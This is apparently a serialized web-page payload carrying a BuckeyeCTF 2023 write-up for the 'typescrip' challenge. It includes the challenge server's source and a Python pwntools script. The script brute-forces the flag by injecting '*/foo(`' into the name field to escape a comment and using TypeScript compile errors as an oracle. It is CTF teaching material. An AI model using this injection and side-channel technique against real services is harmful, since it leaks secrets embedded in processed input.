@@ -1,0 +1,113 @@
+1:"$Sreact.fragment"
+2:I[10453,["/_next/static/chunks/b9afcb09c56609a6.js","/_next/static/chunks/59d5dd52dd9fcb16.js","/_next/static/chunks/0eb309e820c00a6d.js","/_next/static/chunks/239c8c4944a9f036.js","/_next/static/chunks/39b99946d2be6a43.js"],"default"]
+11:I[97367,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"OutletBoundary"]
+12:"$Sreact.suspense"
+:HL["https://user-images.githubusercontent.com/60120929/271787173-bec30743-e4d2-4446-9c53-ebac05d0bdb5.png","image"]
+:HL["https://user-images.githubusercontent.com/60120929/271787201-15c1a765-7c83-4eb0-b2de-f48a37f15e57.png","image"]
+3:T6aa,import { createServer } from "net";
+import { Project } from "ts-morph";
+
+const flag = process.env.FLAG ?? "bctf{fake_flag}";
+
+function compile(source) {
+    const project = new Project({ useInMemoryFileSystem: true });
+    const sourceFile = project.createSourceFile("temp.ts", source);
+    const diagnostics = sourceFile.getPreEmitDiagnostics();
+
+    return diagnostics.map(diagnostic => {
+        const severity = ["Warning", "Error", "Suggestion", "Message"][diagnostic.getCategory()];
+        return `${severity} on line ${diagnostic.getLineNumber()}`;
+    });
+}
+
+const server = createServer(socket => {
+    socket.write("What is your name?\n> ");
+    socket.once("data", data => {
+        const name = data.toString().trim();
+        socket.write(`Hello, ${name}. Give me some code: (end with blank line)\n> `);
+        let code = '';
+        let done = false;
+        socket.on('data', data => {
+            if (done) return;
+            const line = data.toString().trim();
+            if (!line) {
+                done = true;
+                socket.write('Thinking...\n');
+
+                const today = new Date().toLocaleDateString('en-us');
+                const source = `/* TYPE CHECKED FOR ${name} ON ${today}. THE FLAG IS "${flag}". */` + "\n\n" + code;
+
+                const errors = compile(source);
+
+                if (errors.length === 0) {
+                    socket.write('Congrats, your code is perfect\n');
+                } else {
+                    socket.write(errors.join('\n') + '\n');
+                }
+
+                socket.destroy();
+            }
+            if (!done) socket.write('> ');
+
+            code += line + '\n';
+        })
+    });
+});
+
+server.listen(1024);0:{"buildId":"QiRS6Sx9Ttvp1BSl4xu2I","rsc":["$","$1","c",{"children":[["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"BuckeyeCTF 2023 — typescrip"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"I like typescript. Do you like typescript?"}],"\n",["$","p","p-1",{"children":["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"nc chall.pwnoh.io 13381"}]}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a JavaScript server that looks like this:"}],"\n",["$","$L2","pre-0",{"className":"my-2","children":"$3","language":"js"}],"\n",["$","p","p-1",{"children":"The server takes in a \"name\" and some code, then writes and type checks a TypeScript file resembling"}],"\n",["$","$L2","pre-1",{"className":"my-2","children":"/* TYPE CHECKED FOR {name} ON 9/29/2023. THE FLAG IS \"bctf{some_flag}\". */\n\n// your code here","language":"ts"}],"\n",["$","p","p-2",{"children":["reporting back any compilation errors. Note that we don't get what the type errors ",["$","em","em-0",{"children":"are"}],", just whether they exist (and how many there are, and their line numbers)."]}],"\n",["$","p","p-3",{"children":["The main idea is that we can brute force the flag based on whether compilation errors exist in the code. We can break out of the block comment by setting our \"name\" to ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"*/"}],", and store the flag in a (multiline) string using backticks:"]}],"\n","$L4","\n","$L5","\n","$L6","\n","$L7","\n","$L8","\n","$L9","\n","$La"]}]}],["$Lb","$Lc","$Ld","$Le"],"$Lf"]}],"loading":null,"isPartial":false}
+4:["$","$L2","pre-2",{"className":"my-2","children":"/* TYPE CHECKED FOR */foo(` ON 9/29/2023. THE FLAG IS \"bctf{some_flag}\". */\n\n`)\nfunction foo(x: ...) {}","language":"ts"}]
+5:["$","p","p-4",{"children":["Then, type check this string by passing it into the argument to ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"foo()"}],". We can use ",["$","a","a-0",{"href":"https://www.typescriptlang.org/docs/handbook/2/template-literal-types.html","children":"template literal types"}]," to match the flag one character at a time:"]}]
+6:["$","img","img-0",{"width":541,"alt":"image","src":"https://user-images.githubusercontent.com/60120929/271787173-bec30743-e4d2-4446-9c53-ebac05d0bdb5.png"}]
+7:["$","img","img-1",{"width":960,"alt":"image","src":"https://user-images.githubusercontent.com/60120929/271787201-15c1a765-7c83-4eb0-b2de-f48a37f15e57.png"}]
+8:["$","p","p-5",{"children":"If the code compiles, we know the character is in the flag, and can keep looping over characters until none match."}]
+9:["$","p","p-6",{"children":"Here's a quick and inefficient script that does just that:"}]
+10:T47a,import pwn
+
+flag = ''
+letters = [
+    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W',
+    'X', 'Y', 'Z',
+    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w',
+    'x', 'y', 'z',
+    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '_', '$', '@',
+]
+
+while True:
+    for letter in letters:
+        conn = pwn.remote('chall.pwnoh.io', 13381)
+
+        print(conn.recvline())
+        conn.send(b'*/foo(`\n')
+
+        print(conn.recvline())
+        conn.recv()
+        conn.send(b'`)\n')
+
+        conn.recv()
+        code = 'function foo(x: `${string}bctf{' + flag + letter + '${string}}${string}`) {}\n'
+        conn.send(code.encode())
+
+        conn.recv()
+        conn.send(b'\n\n\n\n')
+
+        print(conn.recvline())
+        res = conn.recvline()
+        print(res)
+        if res == b'Congrats, your code is perfect\n':
+            flag += letter
+            print(f'bctf{{{flag}}}')
+            break
+        else:
+            print(letter)
+
+        conn.close()
+    else:
+        break
+
+print(f'bctf{{{flag}}}')a:["$","$L2","pre-3",{"className":"my-2","children":"$10","language":"py"}]
+b:["$","script","script-0",{"src":"/_next/static/chunks/59d5dd52dd9fcb16.js","async":true}]
+c:["$","script","script-1",{"src":"/_next/static/chunks/0eb309e820c00a6d.js","async":true}]
+d:["$","script","script-2",{"src":"/_next/static/chunks/239c8c4944a9f036.js","async":true}]
+e:["$","script","script-3",{"src":"/_next/static/chunks/39b99946d2be6a43.js","async":true}]
+f:["$","$L11",null,{"children":["$","$12",null,{"name":"Next.MetadataOutlet","children":"$@13"}]}]
+13:null
